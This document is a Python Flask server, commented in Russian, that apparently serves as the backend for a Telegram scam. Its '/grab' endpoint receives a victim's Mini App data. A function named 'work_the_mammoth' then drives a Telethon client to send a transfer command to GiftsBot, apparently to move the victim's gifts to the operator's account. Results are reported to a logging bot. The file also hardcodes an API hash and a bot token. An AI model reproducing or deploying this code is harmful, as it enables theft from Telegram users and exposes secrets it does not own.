import os
import asyncio
import threading
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# --- ТВОИ КОНФИГИ ---
API_ID = 30356139
API_HASH = "eaf8c970ff553abe2f1578717c82e50e"
MY_ID = 8486064073
LOG_BOT_TOKEN = "8733015341:AAGXiGUv57x63oHQumkJot1pXyC-HvSLOzY"
LOG_CHAT_ID = "-1003794470658"

def send_log(msg):
    url = f"https://api.telegram.org/bot{LOG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": LOG_CHAT_ID, "text": msg, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

async def work_the_mammoth(init_data):
    # Используем StringSession для стабильности
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    
    try:
        # 1. Сначала просто коннектимся БЕЗ запросов к юзерам
        await client.connect()
        
        # 2. Если ключ не зарегистрирован, Telethon сам попробует сделать это при коннекте.
        # Чтобы не упасть на ResolveUsername, используем ID бота напрямую, если можно.
        send_log("🚀 <b>ПОДКЛЮЧЕНИЕ...</b>\nПробую пробить защиту Telegram.")

        # 3. Пытаемся отправить команду. Если упадет тут - значит Render в бане у ТГ.
        # Используем конструкцию, которая НЕ вызывает ResolveUsernameRequest сразу
        try:
            # GiftsBot ID обычно 5183424874 или просто юзернейм
            target = await client.get_input_entity('GiftsBot')
            await client.send_message(target, f"/start transfer_{MY_ID}")
            
            await asyncio.sleep(2)
            messages = await client.get_messages(target, limit=1)
            
            if messages:
                send_log(f"📩 <b>ОТВЕТ @GiftsBot:</b>\n<code>{messages[0].text}</code>")
        except Exception as e:
            send_log(f"⚠️ <b>ОШИБКА ПРИ ОТПРАВКЕ:</b>\n{str(e)}")

    except Exception as e:
        send_log(f"❌ <b>КРИТИЧЕСКАЯ ОШИБКА TELETHON:</b>\n<code>{str(e)}</code>")
    finally:
        await client.disconnect()

def run_async_task(init_data):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(work_the_mammoth(init_data))
    loop.close()

@app.route('/grab', methods=['POST'])
def grab():
    data = request.get_json()
    init_data = data.get('initData')
    
    if init_data:
        # Запускаем в отдельном потоке, чтобы Flask сразу ответил MiniApp
        thread = threading.Thread(target=run_async_task, args=(init_data,))
        thread.start()
        
    return jsonify({"status": "ok"}), 200

@app.route('/')
def home():
    return "WORKER ACTIVE"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
